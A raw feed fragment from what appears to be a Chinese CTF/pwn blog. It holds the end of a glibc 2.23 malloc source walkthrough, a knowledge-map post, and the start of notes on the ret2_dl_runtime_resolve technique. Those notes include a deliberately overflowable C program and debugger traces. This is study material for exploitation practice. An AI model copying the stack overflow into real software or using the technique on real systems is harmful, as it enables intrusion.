class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>遍历 unsorted bin ， 如果此时的 unsorted bin 只有一项，且他就是 av-&gt;last_remainder ,同时大小满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>就对当前 unsorted bin 进行切割，然后返回切割后的 unsorted bin 。</p><p>否则就先把该 unsorted bin 从 unsorted list 中移除下来，这里用了一个 类似 unlink 的操作，不过没有检查 chunk 的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*先摘下该 unsorted bin  */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>如果申请的大小和该 unsorted bin 的大小刚好相等，就直接返回， 否则就把它放到相应的 bin 里面去。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              .......</span><br><span class="line">              .......</span><br></pre></td></tr></table></figure></p><h3 id="搜索-Largebin"><a href="#搜索-Largebin" class="headerlink" title="搜索 Largebin"></a>搜索 Largebin</h3><p>接下来就会去搜索 largebin 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Top-chunk"><a href="#使用-Top-chunk" class="headerlink" title="使用 Top chunk"></a>使用 Top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">// 如果 top chunk 大小足够大就从 top chunk 里面分配</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 top chunk 的大小足够就直接切割分配，否则如果此时还有 fastbin 就触发 malloc_consolidate 重复上述流程，如果没有 fastbin 调用 sysmalloc 分配内存</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;文中未做说明 均是指 glibc 2.23&lt;/p&gt;
&lt;h2 id=&quot;简单源码分析&quot;&gt;&lt;a href=&quot;#简单源码分析&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 知识图谱</title>
    <link href="https://nocbtm.github.io/2020/02/25/pwn-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    <id>https://nocbtm.github.io/2020/02/25/pwn-知识图谱/</id>
    <published>2020-02-25T04:56:05.000Z</published>
    <updated>2020-04-04T12:10:11.469Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="pwn知识图谱.png" data-src="/imgs/pwn_knowledge_map.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;pwn知识图谱.png&quot; data-src=&quot;/imgs/pwn_knowledge_map.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve学习笔记</title>
    <link href="https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/"/>
    <id>https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/</id>
    <published>2020-02-24T10:11:46.000Z</published>
    <updated>2020-04-09T13:12:12.482Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.freebuf.com/articles/system/170661.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170661.html</a><br><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more</a><br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253833.htm</a><br><a href="https://blog.csdn.net/conansonic/article/details/54634142" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/54634142</a></p><h2 id="前置知识：函数执行流程"><a href="#前置知识：函数执行流程" class="headerlink" title="前置知识：函数执行流程"></a>前置知识：函数执行流程</h2><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc fun.c -fno-stack-protector -m32 -o fun</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以read函数为例，下断点到read@plt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x80482e0</span></span><br><span class="line">Breakpoint 3 at 0x80482e0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">►  0x80482e0  &lt;read@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt; </span><br><span class="line"> // 0x804a00c是read的got.plt表地址，里面存放着0x80482e6</span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0 // _dl_runtime_resolve第二个参数</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; // _dl_runtime_resolve第一个参数</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt; //执行完_dl_fixup后eax存放着glibc中read函数的地址</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;    pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;    mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;    mov    dword ptr [esp], eax  //把read函数地址存到esp</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;    mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;    ret    0xc //返回到 read函数</span><br><span class="line">   0xf7fee01e                             nop</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xw 0x804a00c</span></span><br><span class="line">0x804a00c:0x080482e60xf7df45400x000000000x00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xw 0x804a004</span><br><span class="line">0x804a004:0xf7ffd9180xf7fee0000x080482e60xf7df4540</span><br></pre></td></tr></table></figure><p>通过上面一步一步调试，可以清楚看到函数执行流程，call read@plt –&gt;<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a> –&gt;read@plt+6 –&gt;_dl_runtime_resolve(link_map,rel_offest) –&gt; _dl_fixup –&gt; ret _dl_runtime_resolve+16 –&gt; ret read<br>其中_dl_runtime_resolve函数的两个参数 link_map=0xf7ffd918,rel_offest=0，执行完_dl_runtime_resolve()函数后，就返回到了read函数。</p><p>但绑定的过程是在 _dl_fixup中实现的，接下通过_dl_fixup的源码分析一下函数绑定的实现<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 6</span></span><br><span class="line">00:0000│ esp  0xffffcf04 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcf08 ◂— 0x0</span><br><span class="line">02:0008│      0xffffcf0c —▸ 0x8048424 (fun+25) ◂— add    esp, 0x10</span><br><span class="line">03:000c│      0xffffcf10 ◂— 0x0</span><br><span class="line">04:0010│      0xffffcf14 —▸ 0xffffcf20 ◂— 0x8000</span><br><span class="line">05:0014│      0xffffcf18 ◂— 0x200</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt;</span><br><span class="line">        arg[0]: 0xffffcf94 ◂— 0x0</span><br><span class="line">        arg[1]: 0xffffcf70 ◂— 0x1</span><br></pre></td></tr></table></figure><p>借用Veritas501大佬的图更直观的了解这个过程</p><p><img alt="" data-src="/imgs/ret2-dl-runtime-resolve-1.png" class="lozad"></p><h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>先熟悉一下几个动态链接的一些关键section，以便于分析源码</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个fun上它长这样，事实上这个section所有程序都差不多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484B4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S fun看一下各个段的地址，会发现这三个section的地址跟在ida所示的地址是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">readelf -S fun</span><br><span class="line">共有 31 